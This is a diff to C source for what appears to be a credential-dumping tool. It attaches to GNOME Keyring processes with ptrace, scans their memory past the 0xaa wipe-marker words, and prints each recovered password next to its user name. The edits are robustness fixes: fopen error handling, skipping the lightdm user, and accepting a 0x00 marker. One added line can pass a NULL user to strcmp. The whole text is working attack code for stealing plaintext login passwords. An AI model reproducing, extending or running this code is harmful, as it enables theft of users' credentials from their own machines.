@@ -22,7 +22,11 @@ char *getUser(int pid)
     FILE *fp = NULL;
 
     snprintf(environFile, 128, "%s/%d/environ", PROC, pid);
-    fp = fopen(environFile, "r");
+    if ( (fp = fopen(environFile, "r")) == NULL )
+    {
+        printf("  [!] ERROR: Could not fopen - %s\n", strerror(errno));
+        goto CLEANUP;
+    }
     
     while ( i != maxLines )
     {
@@ -50,7 +54,8 @@ char *getUser(int pid)
     CLEANUP:
         if ( var != NULL )
             free(var);
-        fclose(fp);
+        if ( fp != NULL )
+            fclose(fp);
         return res;
 }
 
@@ -64,6 +69,16 @@ int dumpPasswdKeyring(Target target, int pid)
     int status = -1, loopNum=0, loopMax=4;
     int passwdDone = 0;
     int cur = 0;
+
+    if ( (user = getUser(pid)) == NULL )
+    {
+        printf("  [!] Error getting user for pid\n");
+    }
+
+    if ( !strcmp(user, "lightdm") )
+        return 1; // Skip this one to avoid crash
+
+    printf("[+] GNOME KEYRING (%d)\n", pid);
 
     if ( ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0 )
     {
@@ -80,7 +95,6 @@ int dumpPasswdKeyring(Target target, int pid)
             return -1;
         }
 
-        //eggAddr = eggAddr + target.passwdIndex * sizeof(long);
         while (1)
         {
             if (loopNum == loopMax)
@@ -95,7 +109,7 @@ int dumpPasswdKeyring(Target target, int pid)
                 printf("  [!] ERROR: Ptrace peek marker failed - %s\n", strerror(errno));
                 return -1;
             }
-            if ( (marker & 0xff) != 0xaa )
+            if ( ((marker & 0xff) != 0xaa) && ((marker & 0xff) != 0x00) )
             {
                 eggAddr += sizeof(long)*2; // Password starts 2 words after the last "secure wiped" word
                 break;
@@ -138,9 +152,6 @@ int dumpPasswdKeyring(Target target, int pid)
 
     if (passwd)
     {
-        if ( (user = getUser(pid)) == NULL )
-            printf("  [!] Error getting user for pid\n");
-
         printf("  %s:%s\n", user, passwd);
         return 0;
     }
@@ -181,14 +192,15 @@ int processTarget(Target target)
             continue;
         memset(cmdlineFile, 0, size);
         snprintf(cmdlineFile, size-1, "%s/%d/cmdline", PROC, pid);
-        fp = fopen(cmdlineFile, "r");
+
+        if ( (fp = fopen(cmdlineFile, "r")) == NULL )
+            continue; // likley lost the race for a process that just closed
 
         taskSize = 0;
         if ( getline(&taskName, &taskSize, fp) > 0 )
         {
             if ( strstr(taskName, target.processName) )
             {
-                printf("[+] GNOME KEYRING (%d)\n", pid);
                 if ( dumpPasswdKeyring(target, pid) < 0 )
                 {
                     printf("  [!] ERROR: dumping passwords from keyring\n");
